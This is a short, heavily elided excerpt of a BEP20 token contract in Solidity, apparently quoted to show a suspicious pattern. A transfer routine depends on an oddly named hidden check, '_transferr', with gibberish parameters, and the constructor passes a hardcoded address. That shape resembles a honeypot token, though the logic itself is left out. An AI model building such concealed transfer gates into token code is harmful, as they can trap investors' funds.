...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function _transferr(address wdsawdawd, address rfwaecpien) internal view returns (bool){
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(_transferr(sender,recipient))
...
contract MW is BEP20 {
    constructor() BEP20(
        ...
        0x1c67a307406d68038D59F7108203742E2799e75e
    ){}
}